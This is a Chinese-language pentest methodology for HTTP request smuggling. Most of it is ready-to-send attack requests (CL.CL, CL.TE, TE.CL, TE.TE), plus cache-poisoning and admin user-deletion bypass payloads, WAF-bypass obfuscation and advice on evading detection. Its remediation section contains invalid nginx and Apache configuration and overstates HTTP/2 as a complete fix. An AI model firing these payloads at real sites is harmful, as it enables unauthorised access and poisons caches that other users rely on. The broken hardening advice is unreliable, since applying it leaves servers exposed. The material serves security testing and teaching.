# HTTP 请求走私攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 HTTP 请求走私攻击检测与利用流程，帮助发现和利用 HTTP 解析不一致导致的设计缺陷。

## 1.2 适用范围

本文档适用于所有使用 HTTP 代理、负载均衡器、WAF 或 CDN 的 Web 应用系统，特别是存在多层 HTTP 处理架构的场景。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的高级安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

HTTP 请求走私是指攻击者利用前端服务器（代理/负载均衡器）与后端服务器对 HTTP 请求解析不一致的差异，将恶意请求"走私"到后端服务器，绕过安全检测。

**本质问题**：
- 多层架构设计缺乏统一的 HTTP 解析标准
- 前端与后端服务器对 HTTP 规范理解不一致
- 安全边界设计缺陷

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-444 | HTTP 请求解析不一致 |
| CWE-1125 | 过度攻击面 |
| CWE-657 | 违反安全设计原则 |

### 架构风险

```
典型架构：
客户端 → [代理/负载均衡/WAF] → [后端服务器]
              ↓                      ↓
         解析方式 A              解析方式 B
              ↓                      ↓
         理解为一个请求        理解为两个请求
```

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 架构特征 | 风险点描述 |
|---------|---------|-----------|
| CDN 加速 | CDN→源站 | CDN 与源站解析差异 |
| WAF 防护 | WAF→应用服务器 | WAF 规则绕过 |
| 负载均衡 | LB→多台后端 | 请求路由混乱 |
| API 网关 | 网关→微服务 | 认证绕过 |
| 反向代理 | 代理→应用 | 缓存投毒 |
| 微服务架构 | 服务网格 | 服务间通信劫持 |

## 2.3 漏洞发现方法

### 2.3.1 探测技术

**步骤 1：识别架构**

```bash
# 检测是否存在前端代理
curl -I https://target.com

# 查看响应头
X-Via: CDN
Via: 1.1 varnish
Server: nginx (后端可能是其他)
```

**步骤 2：探测 Content-Length 处理**

```bash
# 发送双 Content-Length 头
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Content-Length: 4

TEST
```

**观察响应**：
- 如果响应延迟，可能触发走私
- 如果返回错误，可能不支持
- 需要多次测试确认

**步骤 3：探测 Transfer-Encoding 处理**

```bash
# 发送 Transfer-Encoding: chunked
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

0

TEST
```

### 2.3.2 自动化检测

```python
# 简化的探测脚本
import socket

def probe_smuggling(host, port, payload):
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    
    # 读取响应
    response = s.recv(4096)
    print(response.decode())
    
    # 尝试发送第二个请求
    s.send(b"GET /probe HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
    response2 = s.recv(4096)
    print(response2.decode())
    
    s.close()
```

## 2.4 漏洞利用方法

### 2.4.1 CL.CL 走私（双 Content-Length）

```http
# 前端使用第一个 Content-Length: 0
# 后端使用最后一个 Content-Length: 4

POST / HTTP/1.1
Host: target.com
Content-Length: 0
Content-Length: 4

GET /admin HTTP/1.1
Host: target.com
X: 
```

**利用效果**：
- 前端认为是一个空请求体
- 后端认为请求体是 `GET /admin...`
- 走私的请求被后端执行

### 2.4.2 CL.TE 走私（Content-Length + Transfer-Encoding）

```http
# 前端使用 Content-Length
# 后端使用 Transfer-Encoding

POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X: X
```

**利用效果**：
- 前端计算 6 字节（`0\r\n\r\n`）
- 后端解析 chunked 编码，读取后续走私请求

### 2.4.3 TE.CL 走私（Transfer-Encoding + Content-Length）

```http
# 前端使用 Transfer-Encoding
# 后端使用 Content-Length

POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

a
TESTGET /admin HTTP/1.1
Host: target.com
X: X
0


```

**利用效果**：
- 前端解析 chunked 编码
- 后端使用 Content-Length 读取 4 字节

### 2.4.4 TE.TE 走私（双 Transfer-Encoding）

```http
# 前端和后端都使用 Transfer-Encoding，但解析方式不同

POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: identity

5
TESTX
0

GET /admin HTTP/1.1
Host: target.com
X: X
```

### 2.4.5 HTTP 响应走私

```http
# 走私恶意响应头

HTTP/1.1 200 OK
Content-Length : 2345
Transfer-Encoding: chunked
Set-Cookie: session=malicious_value

<body>...
```

**利用效果**：
- 利用 header 名与冒号间的空格
- HTTP/1.1 头通过 HTTP/1.0 代理
- 注入恶意响应头到前端响应

### 2.4.6 缓存投毒攻击

```http
# 走私请求导致缓存污染

POST / HTTP/1.1
Host: target.com
Content-Length: 64
Transfer-Encoding: chunked

0

GET /index.html HTTP/1.1
Host: target.com
X-Injected: malicious-value
```

**利用效果**：
- 走私请求访问公开页面
- 注入恶意头影响缓存
- 后续用户获取被投毒的缓存

### 2.4.7 认证绕过攻击

```http
# 绕过 WAF 或认证层

POST /api/transfer HTTP/1.1
Host: target.com
Content-Length: 0
Content-Length: 100

POST /api/admin/deleteUser HTTP/1.1
Host: target.com
Authorization: Bearer stolen_token
target_user=victim
```

**利用效果**：
- 前端 WAF 检查第一个请求（无敏感操作）
- 后端执行走私的管理员请求
- 绕过认证和审计

## 2.5 漏洞利用绕过方法

### 2.5.1 WAF 绕过

**技巧 1：分块编码绕过**

```http
# 将恶意 payload 分散到多个 chunk

POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5
POST 
a
/admin HTTP
10
/1.1\r\nHost: t
0
```

**技巧 2：空白字符混淆**

```http
# 在 header 名中插入空格
Content-Length  : 0
 Content-Length: 100
Content-Length :0
```

### 2.5.2 检测规避

**技巧 3：时间延迟**

```http
# 在走私请求间添加延迟
# 避免被关联分析检测到

POST / HTTP/1.1
...
[走私请求]

[等待 N 秒]

[后续请求]
```

**技巧 4：请求碎片化**

```
将走私请求分散到多个合法请求中
每个请求看起来都正常
组合后形成完整攻击
```

### 2.5.3 架构差异利用

**技巧 5：服务器类型差异**

```
常见组合：
- Apache (前端) + Tomcat (后端)
- Nginx (前端) + Node.js (后端)
- HAProxy (前端) + Gunicorn (后端)

不同服务器对 HTTP 规范理解不同
```

**技巧 6：版本差异**

```
同一服务器不同版本：
- HTTP/1.0 vs HTTP/1.1
- 旧版本 vs 新版本

利用版本间的解析差异
```

---

# 第三部分：附录

## 3.1 HTTP 请求走私测试检查清单

```
□ 双 Content-Length 测试
□ Transfer-Encoding + Content-Length 测试
□ 双 Transfer-Encoding 测试
□ Chunked 编码测试
□ HTTP/1.0 vs HTTP/1.1 测试
□ Header 空格混淆测试
□ 响应走私测试
□ 缓存投毒测试
□ 认证绕过测试
□ WAF 绕过测试
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| Burp Suite | 手动构造走私请求 | https://portswigger.net/burp |
| HTTP Request Smuggler | Burp 扩展自动检测 | https://github.com/PortSwigger/http-request-smuggler |
| 自定义脚本 | 精确控制请求 | Python socket |
| curl | 基础测试 | 系统自带 |

## 3.3 修复建议

### 架构设计层面

1. **统一 HTTP 解析** - 确保前端后端使用相同的 HTTP 解析逻辑
2. **使用 HTTP/2** - HTTP/2 消除了请求走私的根源
3. **禁用 HTTP/1.0** - 仅支持 HTTP/1.1+
4. **部署 WAF 规则** - 检测并阻止走私尝试

### 配置层面

```nginx
# Nginx 配置示例
# 拒绝有歧义的请求

# 拒绝双 Content-Length
if ($http_content_length ~ ",") {
    return 400;
}

# 拒绝 Transfer-Encoding 与 Content-Length 共存
if ($http_transfer_encoding != "" && $http_content_length != "") {
    return 400;
}
```

```apache
# Apache 配置示例
# 严格 HTTP 解析

HttpProtocolStrict On
HttpProtocolOptions Unsafe HeaderStrict On
```

### 实现层面

1. **拒绝歧义请求** - 检测到双 header 时返回错误
2. **规范化处理** - 统一处理 header 大小写和空格
3. **日志记录** - 记录所有异常请求用于分析

---

**参考资源**：
- [CWE-444: Inconsistent Interpretation of HTTP Requests](https://cwe.mitre.org/data/definitions/444.html)
- [PortSwigger - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Request Smuggling Wiki](https://en.wikipedia.org/wiki/HTTP_request_smuggling)
- [James Kettle - HTTP Desync Attacks](https://www.portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
